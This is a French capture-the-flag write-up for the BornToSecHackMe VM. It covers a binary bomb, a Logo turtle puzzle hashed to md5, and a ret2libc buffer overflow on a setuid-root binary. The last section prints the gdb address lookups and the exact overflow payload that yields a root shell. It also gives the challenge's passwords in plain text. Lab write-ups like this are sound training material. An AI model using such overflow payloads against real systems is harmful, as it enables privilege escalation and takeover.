# Branch #1

Note : Pour accéder à cette branche, suivre le writeup #0 (Branche commune) regroupant la partie Boot2ssh

## laurie : Bombe

Le code décompilé traduit en C de la bombe est accessible dans le fichier pseudo_code.c, veuillez vous y referer et suivre les instructions en commentaire pour passer cette partie.
Seulement la phase6 a été crackée en utilisant ghydra, le reste à été traduit de l'assembleur en C à la main.

Mot de passe du compte `thor` : 
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## thor : Turtle

Via une breve recherche sur google ("language turtle", étant donné le nom étonnant du fichier), je suis redirigé vers le language Logo dont turtle fait reférence.
Un interpreteur Logo est disponible ici : http://lwh.free.fr/pages/prog/logo/logo.htm
Le fichier turtle se conclut également par le message `Can you digest the message? :)`, sous entendant la necessité de hasher le mot de passe reçu (via un des algos de hash du type md5, sha2, etc)

Je remplace les commandes afin de les adapter en Logo directement via Notepad++ :
```
Avance n spaces => AV n
Tourne gauche de n degrees => TG n
Tourne droite de n degrees => TD n
Recule n spaces => RE n
```
L'execution dans l'interpreteur Logo écrit `SLASH` dans un style assez... particulier.
Afin de se connecter sur le compte `zaz`, on test differents hash et le `md5` passe.

Le mot de passe du compte `zaz` est donc :
```
646da671ca01bb5d84dbb5fb2238dc8e
```

## zaz : Exploit_me

On a ici un executable `exploit_me` ainsi qu'un dossier `mail`.
Si c'est si gentillement demandé. :)
Au désassemblage (`objdump -d -M intel exploit_me | less`), on remarque un executable enfin de compte assez léger, sans cependant aucune fonction générant un shell.
Ce programme verifie si argv[1] est supérieur à 1, puis effectue un strcpy avec argv[1] et un offset 0x4 d'une pile de 0x90 octets, soit un buffer de 140 caracteres (0x8c).
Via `ls -la` je m'aperçut que le binaire à les droits de `root`.
Un grand `Waaaaaa` façon Waluigi me vient donc en tête.
Une technique magique DOIT ici être utilisée.
RET
2
LIBC
(Ou shellcode pour les stagiaires à Station F)
```
(gdb) print &system
$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
(gdb) find &system, +9999999, "/bin/sh"
0xb7f8cc58
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\x60\xb0\xe6\xb7' + 'LIDL' + '\x58\xcc\xf8\xb7'")
# whoami
root
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```
L'euid (uid effectif) est bien de 0, on est bien rooute, gg wp